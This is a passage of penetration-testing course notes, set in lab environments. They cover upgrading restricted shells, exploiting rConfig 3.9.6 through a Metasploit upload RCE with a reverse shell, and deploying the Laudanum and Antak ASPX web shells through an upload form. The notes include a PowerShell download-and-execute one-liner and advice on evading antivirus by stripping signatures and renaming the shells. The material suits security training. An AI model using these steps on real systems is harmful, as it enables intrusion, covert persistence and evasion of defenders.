        - Directly runs a shell if a file is found (stops after the first match with `quit`).
    - **Example**: Replace `<file>` with a common file (e.g., `passwd`). If the file exists, you get a shell.
7. **Using VIM**:
    - **Command 1**: `vim -c ':!/bin/sh'`
        - Opens VIM and immediately runs a shell.
    - **Command 2**: `vim`, then type `:set shell=/bin/sh` and `:shell`
        - Sets the shell in VIM and launches it.
    - **Example**: Rare, but useful if VIM is installed (`which vim`). Try this if other methods fail.

### Checking Permissions

- **Why Important?**: The shell’s user account (e.g., `apache`) determines what commands you can run and whether you can escalate privileges.
- **Commands**:
    - **File Permissions**: `ls -la <path/to/file>` shows what files or binaries you can access.
        - Example: `ls -la /bin/bash` checks if you can execute the shell.
    - **Sudo Permissions**: `sudo -l` lists commands you can run as a superuser.
        - Example Output: Shows if the `apache` user can run `ALL` commands without a password.
        - Note: Requires an interactive shell for reliable output.
- **Purpose**: Permissions help you understand your access level and find ways to gain more control (e.g., privilege escalation).

### Key Takeaways

- Limited shells restrict your actions; upgrading to an interactive shell is essential.
- Use tools like `/bin/sh`, Perl, Ruby, Lua, AWK, `find`, or VIM based on what’s available.
- Always check permissions (`ls -la`, `sudo -l`) to plan your next steps.
- Practice these commands on platforms like Hack The Box to build confidence.

---

## Linux Example: Practical Linux Exploitation

### Overview

- **Context**: Over 70% of web servers run Linux/Unix, making them key targets for penetration testers. Gaining a shell on these systems can help you pivot to other parts of a network.
- **Goal**: Exploit a vulnerable web application (rConfig 3.9.6) on a Linux server to gain a shell and upgrade it to an interactive shell.

### Key Questions to Ask

When targeting a Linux system, consider:

- What Linux distribution is running?
- What shells or programming languages are available?
- What role does the system play in the network?
- What applications are hosted?
- Are there known vulnerabilities?

### Step-by-Step Exploitation

1. **Enumeration with Nmap**:
    - **Command**: `nmap -sC -sV 10.129.201.101`
    - **Purpose**: Scans the target to identify open ports and services.
    - **Findings**:
        - **21/TCP**: FTP (vsftpd 2.0.8 or later).
        - **22/TCP**: SSH (OpenSSH 7.4).
        - **80/TCP**: HTTP (Apache 2.4.29, PHP 7.2.24, rConfig 3.9.6).
    - **Why Important?**: Identifies the web app (rConfig) as a potential target.
2. **Vulnerability Research**:
    - **Method**: Search Google for `rconfig 3.9.6 vulnerability`.
    - **Findings**:
        - Arbitrary file upload leading to remote code execution (RCE) on Exploit-DB.
        - Directory traversal (CVE-2020-15712).
        - SQL injection vulnerabilities.
    - **Why Important?**: Confirms rConfig 3.9.6 has exploitable flaws.
3. **Metasploit Search**:
    - **Command**: `msf6 > search rconfig`
    - **Result**: Finds `exploit/linux/http/rconfig_vendors_auth_file_upload_rce`, which exploits file uploads for RCE.
    - **Note**: If the module isn’t in Metasploit, check GitHub for `rconfig_vendors_auth_file_upload_rce.rb` and copy it to `/usr/share/metasploit-framework/modules/exploits/`.
        - **Command**: `locate exploits` to find the directory.
        - **Update Metasploit**: `apt update; apt install metasploit-framework`.
4. **Exploit Execution**:
    - **Command**: `msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`
    - **Steps**:
        - Checks if rConfig 3.9.6 is running.
        - Logs into rConfig’s web interface.
        - Uploads a PHP payload (`olxapybdo.php`) for a reverse shell.
        - Triggers the payload to connect back to your machine (e.g., `10.10.14.111:4444`).
        - Deletes the payload to clean up.
    - **Result**: Opens a Meterpreter session (a powerful shell in Metasploit).
    - **Output Example**:
        
        ```
        [*] Started reverse TCP handler on 10.10.14.111:4444
        [+] The target appears to be vulnerable. Vulnerable version of rConfig found!
        [*] Uploading file 'olxapybdo.php'...
        [*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860)
        
        ```
        
5. **Interacting with the Shell**:
    - **Command**: `meterpreter > shell`
    - **Issue**: Drops into a **non-TTY shell** (no prompt, limited commands) as the `apache` user.
        - Example: Running `dir` works, but `sudo` or `su` may fail.
    - **Why?**: The `apache` user isn’t set up for interactive shells, as it’s meant for running the web server, not user logins.
6. **Spawning a TTY Shell with Python**:
    - **Check for Python**: `which python` (confirms Python is installed).
    - **Command**: `python -c 'import pty; pty.spawn("/bin/sh")'`
    - **What It Does**: Uses Python’s `pty` module to spawn an interactive Bourne shell (`/bin/sh`).
    - **Result**: Interactive shell with a prompt (`sh-4.2$`). Confirm user with `whoami` (returns `apache`).
    - **Why Important?**: Enables advanced commands and prepares for privilege escalation.

### Key Takeaways

- **Enumeration**: Use Nmap to find services and versions, guiding your attack plan.
- **Research**: Search for vulnerabilities (Google, Exploit-DB) to identify exploits.
- **Metasploit**: Simplifies exploitation but may require manual module installation.
- **Shell Upgrading**: Non-TTY shells are limited; use Python to spawn a TTY shell for full functionality.
- **User Context**: The `apache` user has limited permissions, so plan for privilege escalation.
- Practice this workflow (enumerate, exploit, upgrade shell) on platforms like Hack The Box.

---

# Laudanum Web Shell Notes

## Overview: What is Laudanum?

- **Definition**: Laudanum is a collection of pre-made files (scripts) designed for penetration testers to inject into vulnerable web servers. These files allow you to:
    - Gain a **web shell** to run commands on the server via a browser.
    - Set up a **reverse shell** for a direct connection back to your machine.
    - Perform other malicious actions (e.g., file uploads, system reconnaissance).
- **Supported Languages**: Includes scripts for multiple web application languages:
    - ASP (Active Server Pages).
    - ASPX (ASP.NET).
    - JSP (JavaServer Pages).
    - PHP (Hypertext Preprocessor).
    - And more.
- **Why Important?**: Laudanum is a go-to tool for pentesters because it provides ready-to-use payloads, saving time when exploiting web vulnerabilities.
- **Availability**:
    - Built into **Parrot OS** and **Kali Linux** by default (found in `/usr/share/laudanum`).
    - For other Linux distributions, download it from the official repository (link provided in the PDF).
- **Use Case**: If you find a web application with a file upload vulnerability, you can use a Laudanum script to upload a web shell and control the server.

---

## Working with Laudanum

### Location and Setup

- **Directory**: On Parrot OS or Kali, Laudanum files are located in `/usr/share/laudanum`.
- **Usage**: Most files can be copied directly to the target server without changes. However, for **shell scripts** (e.g., web or reverse shells), you need to:
    1. **Edit the file** to include your attacking machine’s IP address.
    2. Ensure the script connects back to you (for reverse shells) or is accessible via the browser (for web shells).
- **Precaution**: Always read the file’s contents and comments before using it. The comments explain:
    - What the script does.
    - Any required modifications (e.g., IP address, port).
    - How to deploy it.

### Example: Preparing a Shell

- **Command**: Copy a Laudanum file for modification.
    
    ```bash
    cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
    
    ```
    
- **What It Does**: Copies the ASPX web shell (`shell.aspx`) to a working directory as `demo.aspx`.
- **Modifications**:
    - Open `demo.aspx` in a text editor (e.g., `nano` or `vim`).
    - Find the `allowedips` variable (around line 59) and add your attacking machine’s IP address (e.g., `10.10.14.111`).
        - This ensures only your machine can access the shell, improving security.
    - **Optional**: Remove ASCII art and comments from the file.
        - Why? These can be detected by antivirus (AV) or intrusion detection systems (IDS) as suspicious.
- **Example Modification**:
    
    ```
    string[] allowedips = new string[] { "10.10.14.111" }; // Your IP here
    
    ```
    

### Why Modify Carefully?

- Incorrect IP or port settings can prevent the shell from working.
- Leaving comments or ASCII art may alert defenders to your presence.
- Always test the modified file in a lab environment (e.g., Hack The Box) before using it in a real engagement.

---

## Laudanum Demonstration: Deploying a Web Shell

### Scenario Setup

- **Target**: A web application at `status.inkanefreight.local` (a lab environment).
- **Requirement**: Add the target to your `/etc/hosts` file to resolve the domain.
    - **Command** (on your attack VM or Pwnbox):
        
        ```bash
        echo "<target_ip> status.inkanefreight.local" >> /etc/hosts
        
        ```
        
        - Replace `<target_ip>` with the actual IP (e.g., `10.129.201.101`).
    - **Why?**: Ensures your machine can access the target URL.
- **Environment**: You need to be on the lab VPN or using Pwnbox to follow along.

### Step-by-Step Process

1. **Prepare the Shell**:
    - Copy and modify the ASPX shell as shown above:
        
        ```bash
        cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
        
        ```
        
    - Edit `demo.aspx` to set `allowedips` to your IP and remove unnecessary comments/ASCII art.
2. **Exploit the Upload Function**:
    - **Target Page**: The web app has an upload feature at the bottom of the status page (indicated by a green arrow in the PDF).
    - **Action**:
        - Navigate to `http://status.inkanefreight.local` in your browser.
        - Use the upload form to upload `demo.aspx`.
    - **Result**: If successful, the app displays the path where the file was saved (e.g., `/files/demo.aspx`, indicated by a yellow arrow).
    - **Note**: Some apps may:
        - Randomize filenames on upload.
        - Store files in non-public directories.
        - Have other safeguards.
        - In this case, the file is uploaded to `/files/demo.aspx` with the original name.
3. **Navigate to the Shell**:
    - **URL**: Access the uploaded shell at:
        
        ```
        http://status.inkanefreight.local/files/demo.aspx
        
        ```
        
    - **Note**: The PDF mentions the path uses backslashes (`\`) internally (e.g., `status.inkanefreight.local\files\demo.aspx`), but the browser converts these to forward slashes (`/`) in the URL.
    - **Result**: The Laudanum ASPX shell interface loads in your browser.
4. **Use the Shell**:
    - **Interface**: The shell provides a text box to enter commands (e.g., `cmd /c systeminfo` for Windows or `whoami` for Linux).
    - **Example**:
        - Enter `cmd /c systeminfo` and click “Submit Query.”
        - Output: Displays system information (e.g., OS version, hostname) in the browser.
    - **Sections**:
        - **STDOUT**: Shows the command’s output.
        - **STDERR**: Shows any errors.
    - **Why Useful?**: You can now run commands on the server directly from your browser.

### Example Output

- **Command**: `cmd /c systeminfo`
- **Result**: The browser shows details about the server (e.g., Windows version, installed patches).
- **Significance**: Confirms the web shell is working and you have remote code execution (RCE).

---

## Key Takeaways

- **Laudanum’s Power**: Provides ready-to-use scripts for web shells and reverse shells in multiple languages (ASP, ASPX, JSP, PHP).
- **Setup**:
    - Found in `/usr/share/laudanum` on Parrot OS/Kali.
    - Requires modification (e.g., setting your IP in `allowedips`) for shell scripts.
    - Remove comments/ASCII art to avoid detection.
- **Deployment**:
    - Exploit file upload vulnerabilities to place the shell on the target.
    - Navigate to the uploaded file’s URL to access the shell interface.
    - Use the shell to run commands (e.g., `whoami`, `systeminfo`).
- **Challenges**:
    - Some apps randomize filenames or restrict file access, requiring additional enumeration.
    - Always verify the upload path and ensure your IP is correctly set.
- **Practice Tips**:
    - Test Laudanum in lab environments like Hack The Box or TryHackMe.
    - Experiment with different file types (e.g., PHP vs. ASPX) to understand their behavior.
    - Practice modifying files to avoid detection (e.g., removing signatures).

---

## Tips for Using Laudanum Effectively

- **Before Uploading**:
    - Check the target’s web server to determine the supported language (e.g., PHP for Apache, ASPX for IIS).
    - Use the appropriate Laudanum file (e.g., `shell.php` for PHP, `shell.aspx` for ASPX).
- **Stealth**:
    - Rename the file to something innocuous (e.g., `image.aspx` instead of `shell.aspx`) to avoid suspicion.
    - Remove or obfuscate code that might trigger antivirus.
- **Troubleshooting**:
    - If the shell doesn’t work, verify:
        - The file was uploaded to a publicly accessible directory.
        - The URL is correct (check for randomized filenames).
        - Your IP is allowed in `allowedips`.
    - Use tools like `curl` or `Burp Suite` to test the upload and access.
- **Next Steps**:
    - Use the web shell to gather system info (e.g., `whoami`, `net user`).
    - Escalate to a reverse shell for more stable access (e.g., use a Laudanum reverse shell script).
    - Check permissions (`sudo -l` or `net localgroup administrators`) for privilege escalation.

---

# Antak Web Shell Notes

These notes summarize the key points from **14 Antak Web Shell.pdf**, focusing on using the Antak web shell from the Nishang project to gain access to Windows servers during penetration testing. The goal is to help you understand what Antak is, how to configure and deploy it, and how to supplement your learning with video resources. The notes are written for easy reference and clear understanding, especially for beginners.

---

## Overview: Learning Resource and ASPX Basics

### Learning Tip: IPPSEC’s Blog

- **What Is It?**: IPPSEC’s blog (ipsec.rocks) is a powerful learning tool that indexes YouTube video walkthroughs for hacking concepts, including web shells like ASPX.
- **How It Works**:
    - Search for a topic (e.g., “aspx”) on the site.
    - The site lists videos with timestamps where the concept is demonstrated.
    - Click a link to jump to the relevant section of the video.
- **Why Useful?**:
    - Combines reading (like HTB Academy) with visual demonstrations.
    - Videos can be watched casually (e.g., during lunch, on the couch).
    - Helps visualize complex concepts through real-world examples.
- **Example**:
    - Search “aspx” on ipsec.rocks.
    - Watch IPPSEC’s “Cereal” video (retired Hack The Box machine) from 1:17 to 1:20.
        - **What You’ll See**: IPPSEC uploads an ASPX web shell via HTTP, navigates to it in a browser, and runs commands on a Windows server.
        - **Key Insight**: Shows how an ASPX shell provides command execution on the underlying OS.
- **Tip**: Subscribe to IPPSEC’s YouTube channel for more hacking tutorials.

### What is ASPX?

- **Definition**: Active Server Page Extended (ASPX) is a file type used in Microsoft’s ASP.NET framework.
- **How It Works**:
    - ASPX pages generate dynamic web forms for user input (e.g., login forms).
    - On the server, ASPX code processes the input and converts it to HTML for the browser.
- **Why Important for Pentesters?**:
    - ASPX runs on Windows servers with ASP.NET (common in enterprise environments).
    - Vulnerabilities (e.g., file uploads) in ASPX apps can be exploited to upload web shells.
    - A web shell lets you control the Windows OS (e.g., run PowerShell commands).

---

## What is Antak?

- **Definition**: Antak is an ASPX-based web shell included in the **Nishang** project, an Offensive PowerShell toolset for penetration testing.
- **Purpose**: Provides a browser-based interface to interact with a Windows server’s OS using PowerShell.
- **Key Features**:
    - Mimics a PowerShell console in the browser, with a themed UI.
    - Executes commands as new processes.
    - Supports:
        - Running PowerShell commands (e.g., `dir`, `whoami`).
        - Uploading/downloading files.
        - Executing scripts in memory.
        - Encoding commands for stealth.
- **Why Powerful?**: Combines ASPX’s web capabilities with PowerShell’s flexibility, making it ideal for Windows server exploitation.
- **Use Case**: Upload Antak to a vulnerable Windows web app to gain remote code execution (RCE) and perform tasks like reconnaissance or payload delivery.

---

## Working with Antak

### Location and Setup

- **Directory**: On Parrot OS or Kali, Antak files are located in:
    
    ```
    /usr/share/nishang/Antak-Webshell
    
    ```
    
- **Files**:
    - `antak.aspx`: The main web shell script.
    - `Readme.md`: Documentation with usage instructions.
- **Command to List Files**:**Output**: `antak.aspx Readme.md`
    
    ```bash
    ls /usr/share/nishang/Antak-Webshell
    
    ```
    
- **Preparation**:
    - Copy `antak.aspx` to a working directory for modification.
    - Edit the file to add credentials (username and password) for secure access.
    - Remove unnecessary elements (e.g., ASCII art, comments) to avoid detection.

### Example: Preparing the Shell

- **Command**: Copy the Antak file.
    
    ```bash
    cp /usr/share/nishang/Antak-Webshell/antak.aspx /home/administrator/Up
    
    ```
    
- **What It Does**: Copies `antak.aspx` to `/home/administrator/Up` for editing.
- **Modifications**:
    - Open `antak.aspx` in a text editor (e.g., `nano` or `vim`).
    - On **line 14**, set a username and password for the shell’s login prompt.
        - **Example**:
            
            ```
            string username = "admin"; // Set your username
            string password = "P@ssw0rd"; // Set your password
            
            ```
            
        - **Why?**: Adds authentication to prevent unauthorized access (e.g., random users stumbling upon the shell).
    - **Optional**: Remove ASCII art and comments.
        - **Why?**: These can trigger antivirus (AV) or intrusion detection systems (IDS) by matching known signatures.
- **Why Secure Credentials?**:
    - Ensures only you can access the shell.
    - Protects your operations during a pentest.

---

## Antak Demonstration: Deploying the Web Shell

### Scenario Setup

- **Target**: The same web application from the Laudanum section (`status.inkanefreight.local`), running on a Windows server.
- **Requirement**: Add the target to your `/etc/hosts` file to resolve the domain.
    - **Command** (on your attack VM or Pwnbox):
        
        ```bash
        echo "<target_ip> status.inkanefreight.local" >> /etc/hosts
        
        ```
        
        - Replace `<target_ip>` with the actual IP (e.g., `10.129.201.101`).
    - **Why?**: Ensures your machine can access the target URL.
- **Environment**: You need to be on the lab VPN or using Pwnbox to follow along.

### Step-by-Step Process

1. **Prepare the Shell**:
    - Copy and modify `antak.aspx`:
        
        ```bash
        cp /usr/share/nishang/Antak-Webshell/antak.aspx /home/administrator/Up
        
        ```
        
    - Edit `antak.aspx`:
        - Set username and password on line 14.
        - Remove ASCII art/comments to reduce detection risk.
2. **Exploit the Upload Function**:
    - **Target Page**: The web app has an upload feature at `http://status.inkanefreight.local` (same as Laudanum demo).
    - **Action**:
        - Navigate to the upload form.
        - Upload the modified `antak.aspx`.
    - **Result**: The file is stored in the `/files` directory (e.g., `/files/antak.aspx`).
    - **Note**: The app uses backslashes (`\`) internally, but the browser shows forward slashes (`/`) in the URL.
3. **Navigate to the Shell**:
    - **URL**: Access the shell at:
        
        ```
        http://status.inkanefreight.local/files/antak.aspx
        
        ```
        
    - **Result**: A login prompt appears, asking for the username and password set in `antak.aspx`.
    - **Action**: Enter the credentials (e.g., `admin`/`P@ssw0rd`).
    - **Outcome**: The Antak interface loads, showing a PowerShell-themed console.
4. **Use the Shell**:
    - **Interface**: Features include:
        - **Command Input**: Enter PowerShell commands (e.g., `dir C:\Users`).
        - **Upload/Download**: Upload files or download files from the server.
        - **Encode and Execute**: Run encoded scripts for stealth.
        - **Parse web.config**: Extract configuration details.
        - **Execute SQL Query**: Run SQL queries (requires a connection string).
    - **Example Command**:
        - Enter: `dir C:\Users`
        - **Output**:
            
            ```
            Directory: C:\Users
            Mode                LastWriteTime         Length Name
            ----                -------------         ------ ----
            d-----        9/27/2021   5:37 PM                Administrator
            d-----        9/12/2021   1:50 PM                Public
            ...
            
            ```
            
        - **What It Shows**: Lists user directories on the Windows server.
    - **Help Command**:
        - Enter: `help`
        - **Output**: Displays available commands and features.
        - **Why Useful?**: Guides you if you’re unsure what to do next.
5. **Advanced Usage**:
    - **Upload Payloads**: Use the “Upload the File” feature to deliver additional payloads (e.g., a reverse shell).
    - **PowerShell One-Liner**: Download and execute a payload directly:
        
        ```powershell
        Invoke-WebRequest -Uri "http://<your_ip>/payload.ps1" -OutFile "payload.ps1"; .\payload.ps1
        
        ```
        
    - **Callback to C2**: Use Antak to deliver a payload that connects to your command and control (C2) platform (e.g., Metasploit, Cobalt Strike).

### Example Output

- **Command**: `dir C:\Users`
- **Result**: Lists user directories, confirming you can interact with the Windows filesystem.
- **Significance**: Verifies the web shell provides RCE via PowerShell.

---

## Key Takeaways

- **Antak’s Power**: A versatile ASPX web shell that uses PowerShell to control Windows servers, offering features like command execution, file uploads, and script encoding.
- **Setup**:
    - Found in `/usr/share/nishang/Antak-Webshell` on Parrot OS/Kali.
    - Requires modification (e.g., adding username/password on line 14, removing ASCII art/comments).
- **Deployment**:
    - Exploit file upload vulnerabilities to place `antak.aspx` on the target.
    - Access the shell via the browser, authenticate, and run PowerShell commands.
- **Learning Resource**:
    - Use IPPSEC’s blog (ipsec.rocks) to find video demonstrations of ASPX shells and other hacking concepts.
    - Watch the “Cereal” video (1:17–1:20) for a practical ASPX shell example.
- **Challenges**:
    - Ensure the target supports ASPX (common on Windows servers with ASP.NET).
    - Verify the upload path and credentials.
    - Avoid detection by removing signatures (e.g., ASCII art).
- **Practice Tips**:
    - Test Antak in lab environments like Hack The Box or TryHackMe.
    - Experiment with PowerShell commands and file uploads to understand Antak’s capabilities.
    - Combine Antak with other Nishang tools for advanced attacks.

---

## Tips for Using Antak Effectively

- **Before Uploading**:
    - Confirm the target runs ASP.NET (e.g., check for `.aspx` pages or IIS server headers).
    - Use `antak.aspx` only on Windows servers, as it relies on PowerShell.
- **Stealth**:
    - Rename the file (e.g., `config.aspx`) to blend in.
    - Obfuscate code or remove comments to evade AV/IDS.
- **Troubleshooting**:
    - If the shell doesn’t load:
        - Check the upload directory (e.g., `/files`).
        - Verify the URL and credentials.
        - Use `curl` or `Burp Suite` to debug.
    - If commands fail, ensure PowerShell is available (`powershell -v`).
- **Next Steps**:
    - Run reconnaissance commands (e.g., `whoami`, `net user`, `systeminfo`).
    - Upload a reverse shell payload for stable access.
    - Check for privilege escalation (e.g., `net localgroup administrators`).

---